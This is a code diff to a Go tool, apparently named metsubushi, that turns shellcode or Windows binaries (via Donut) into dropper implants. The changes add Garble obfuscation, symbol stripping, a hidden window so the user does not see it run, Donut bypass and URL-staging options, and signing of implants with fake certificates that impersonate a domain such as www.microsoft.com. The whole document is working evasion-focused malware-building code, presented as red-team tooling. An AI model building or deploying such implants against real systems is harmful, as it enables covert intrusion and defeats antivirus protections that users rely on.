@@ -17,9 +17,11 @@ import (
 	"io"
 	"io/ioutil"
 	"log"
+	"metsubushi/limelighter"
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strconv"
 	"strings"
 
 	"github.com/Binject/go-donut/donut"
@@ -48,10 +50,10 @@ func banner() {
 }
 
 func padShellcode(shellcode []byte, length int) []byte {
-	l := len(shellcode)
-	r := l % length
-	s := l + (length - r)
-	tmp := make([]byte, s)
+	lenShell := len(shellcode)
+	remainder := lenShell % length
+	paddedLen := lenShell + (length - remainder)
+	tmp := make([]byte, paddedLen)
 	copy(tmp, shellcode)
 	return tmp
 }
@@ -78,22 +80,12 @@ func encryptShellcode(key, shellcode []byte) ([]byte, error) {
 	return ciphertext, nil
 }
 
-// Mostly ripped from Go-Donut and adjusted for my own use.
-func generateDonutShellcode(inFile, arch string) ([]byte, error) {
-	var donutArch donut.DonutArch
-	switch strings.ToLower(arch) {
-	case "x32", "386", "x86":
-		donutArch = donut.X32
-	case "x64", "amd64":
-		donutArch = donut.X64
-	case "x84":
-		donutArch = donut.X84
-	default:
-		log.Fatal("Unknown architecture provided")
-	}
-
+// convert -d argument string to DonutConfig
+// if string is empty return a basic config
+func convertArgsToConfig(args string) (*donut.DonutConfig, error) {
+	// assign basic default config for starters...
 	config := new(donut.DonutConfig)
-	config.Arch = donutArch
+	config.Arch = donut.X64
 	config.Entropy = uint32(3)
 	config.OEP = uint64(0)
 	config.InstType = donut.DONUT_INSTANCE_PIC
@@ -102,6 +94,97 @@ func generateDonutShellcode(inFile, arch string) ([]byte, error) {
 	config.Format = uint32(1)
 	config.ExitOpt = uint32(1)
 	config.Thread = 1
+
+	// parse the argument string
+	var tmp []string
+	var i int
+	var err error
+	for _, value := range strings.Split(args, ",") {
+		tmp = strings.Split(value, "=")
+
+		switch tmp[0] {
+		case "n", "module":
+			config.ModuleName = tmp[1]
+		case "u", "url":
+			config.URL = tmp[1]
+			config.InstType = donut.DONUT_INSTANCE_URL
+		case "e", "entropy":
+			i, err = strconv.Atoi(tmp[1])
+			if err != nil {
+				return nil, err
+			}
+			config.Entropy = uint32(i)
+		case "a", "arch":
+			var donutArch donut.DonutArch
+			switch strings.ToLower(tmp[1]) {
+			case "x32", "386", "x86":
+				donutArch = donut.X32
+			case "x64", "amd64":
+				donutArch = donut.X64
+			case "x84":
+				donutArch = donut.X84
+			default:
+				log.Fatal("Unknown architecture provided")
+			}
+			config.Arch = donutArch
+		case "b", "bypass":
+			config.Bypass, err = strconv.Atoi(tmp[1])
+			if err != nil {
+				return nil, err
+			}
+		case "f", "format":
+			i, err = strconv.Atoi(tmp[1])
+			if err != nil {
+				return nil, err
+			}
+			config.Format = uint32(i)
+		case "y", "oep":
+			u, err := strconv.ParseUint(tmp[1], 16, 64)
+			if err != nil {
+				return nil, err
+			}
+			config.OEP = u
+		case "x", "exit":
+			i, err = strconv.Atoi(tmp[1])
+			if err != nil {
+				return nil, err
+			}
+			config.ExitOpt = uint32(i)
+		case "c", "class":
+			config.Class = tmp[1]
+		case "d", "domain":
+			config.Domain = tmp[1]
+		case "m", "method":
+			config.Method = tmp[1]
+		case "p", "params":
+			config.Parameters = tmp[1]
+		case "w", "unicode":
+			config.Unicode = 1
+		case "r", "runtime":
+			config.Runtime = tmp[1]
+		case "t", "thread":
+			config.Thread = 1
+		case "z", "compress":
+			i, err = strconv.Atoi(tmp[1])
+			if err != nil {
+				return nil, err
+			}
+			config.Compress = uint32(i)
+		default:
+		}
+	}
+
+	return config, nil
+}
+
+// TODO: Adjust function to utilise user-supplied arguments
+// Mostly ripped from Go-Donut and adjusted for my own use.
+func generateDonutShellcode(inFile, args string) ([]byte, error) {
+
+	config, err := convertArgsToConfig(args)
+	if err != nil {
+		return nil, err
+	}
 
 	shellcode, err := donut.ShellcodeFromFile(inFile, config)
 
@@ -118,7 +201,7 @@ func generateHexVar(src []byte) []byte {
 	return []byte(buff.String())
 }
 
-func compile(projectDirectory, projectName, arch string) error {
+func compile(projectDirectory, projectName, arch string, useGarble bool) error {
 
 	err := os.Chdir(projectDirectory)
 	if err != nil {
@@ -145,12 +228,20 @@ func compile(projectDirectory, projectName, arch string) error {
 		fmt.Printf(string(cmd))
 	}
 
-	// locate absolute paths to binaries to avoid Kn1ght getting
-	//   root with PATH hijacking.
-	goBinary, err := exec.LookPath("go")
-	if err != nil {
-		fmt.Println("[!] Unable to locate Go compiler. Be sure it's within your PATH.")
-		return err
+	// locate absolute path to Go compiler or Garble obfuscator
+	var goBinary string
+	if !useGarble {
+		goBinary, err = exec.LookPath("go")
+		if err != nil {
+			fmt.Println("[!] Unable to locate Go compiler. Be sure it's within your PATH.")
+			return err
+		}
+	} else {
+		goBinary, err = exec.LookPath("garble")
+		if err != nil {
+			fmt.Println("[!] Unable to locate Garble. Be sure it's within your PATH.")
+			return err
+		}
 	}
 
 	envBinary, err := exec.LookPath("env")
@@ -159,24 +250,10 @@ func compile(projectDirectory, projectName, arch string) error {
 		return err
 	}
 
-	// Unsure which of the following methods is the cleanest.
-	/*
-		var projectArch string
-		switch strings.ToLower(arch) {
-		case "386":
-			projectArch = "GOARCH=386"
-		case "amd64":
-			projectArch = "GOARCH=amd64"
-		default:
-			// odd if we get to here but for sanity sake...
-			projectArch = "GOARCH=amd64"
-		}
-	*/
-
 	// arch is pre-sanitised so there should be no chance of error with this method.
 	projectArch := "GOARCH=" + arch
 	// the Go build flags are to hide the droppers window from the user. (Akin to using WinMain() in C)
-	cmd, err = exec.Command(envBinary, "GOOS=windows", projectArch, goBinary, "build", "-ldflags", "-H=windowsgui").Output()
+	cmd, err = exec.Command(envBinary, "GOOS=windows", projectArch, goBinary, "build", "-ldflags=-s -w -H=windowsgui").Output()
 	if err != nil {
 		fmt.Println("[!] Error compiling Go file.")
 		return err
@@ -186,17 +263,34 @@ func compile(projectDirectory, projectName, arch string) error {
 	return nil
 }
 
+// sign our implant using Limelighter library from Scarecrow by Tylous/Optiv
+func signBinary(domain, inFile string) string {
+	password := limelighter.VarNumberLength(8, 12)
+	pfx := domain + ".pfx"
+	limelighter.GenerateCert(domain, inFile)
+	limelighter.GeneratePFK(password, domain)
+
+	splitFileName := strings.Split(inFile, ".")
+	absFile := strings.Join(splitFileName[:len(splitFileName)-1], "") + "_signed.exe"
+
+	limelighter.SignExecutable(password, pfx, inFile, absFile)
+
+	return absFile
+}
+
 func main() {
 
-	var payloadFile, templateFile, outFile, arch string
-	var helpRequired, useDonut, startQuiet bool
+	var payloadFile, templateFile, outFile, arch, donutArgs, signImplant string
+	var helpRequired, startQuiet, useGarble bool
 	flag.StringVar(&payloadFile, "p", "", "Windows binary or raw shellcode file. (Use -d with Windows binaries to generate Donut shellcode).")
-	flag.StringVar(&templateFile, "t", "basic", "Name of the template to use.")
+	flag.StringVar(&templateFile, "t", "basic.go", "Name of the template to use.")
 	flag.StringVar(&outFile, "o", "not-a-backdoor.exe", "Filename of the generated implant binary.")
 	flag.StringVar(&arch, "a", "x64", "Architecture to compile for. 'x64' or 'x86'.")
+	flag.StringVar(&donutArgs, "d", "unused", "Use Donut to generate shellcode from a Windows binary.")
+	flag.StringVar(&signImplant, "s", "", "Sign implant using Limelighter. Provide a domain. Eg. www.microsoft.com")
 	flag.BoolVar(&helpRequired, "help", false, "This help menu.")
-	flag.BoolVar(&useDonut, "d", false, "Use Donut to generate shellcode from a Windows binary.")
 	flag.BoolVar(&startQuiet, "q", false, "Start without showing the secksual ASCII artwork.")
+	flag.BoolVar(&useGarble, "g", false, "Use Garble to obfuscate the generated implant.")
 
 	flag.Parse()
 
@@ -229,9 +323,9 @@ func main() {
 
 	var payloadContent []byte
 	var err error
-	if useDonut {
+	if donutArgs != "unused" {
 		fmt.Println("[+] Generating Donut shellcode from:", payloadFile)
-		payloadContent, err = generateDonutShellcode(payloadFile, arch)
+		payloadContent, err = generateDonutShellcode(payloadFile, donutArgs)
 		if err != nil {
 			fmt.Println("[!] Could not generate shellcode with Donut.")
 			return
@@ -295,14 +389,27 @@ func main() {
 		return
 	}
 
-	fmt.Printf("[+] Attempting to cross-compile: %s\n", outputFile)
-	compile := compile(outputDirectory, fileNameWithoutExt, arch)
+	var compilerName string
+	if useGarble {
+		compilerName = "Garble obfuscator"
+	} else {
+		compilerName = "Go compiler"
+	}
+	fmt.Printf("[+] Using %s to build: %s\n", compilerName, outputFile)
+	compile := compile(outputDirectory, fileNameWithoutExt, arch, useGarble)
 	if compile != nil {
 		fmt.Println("[!] Error compiling file")
 		return
 	}
 
 	fmt.Println("[+] Compiled successfully")
-	fmt.Println("[+] !! Test payload in lab environment before running on target. !!")
 	fmt.Println("[+] Implant generated at:", outputDirectory+"/"+outFile)
+
+	if signImplant != "" {
+		fmt.Println("[+] Attempting to create a signed implant using domain:", signImplant)
+		signedFile := signBinary(signImplant, outputDirectory+"/"+outFile)
+		fmt.Printf("[+] Signed binary should be located at:  %s\n", signedFile)
+	}
+
+	fmt.Println("[+] !! Test payload with redress and execute in lab environment before use on engagements. !!")
 }
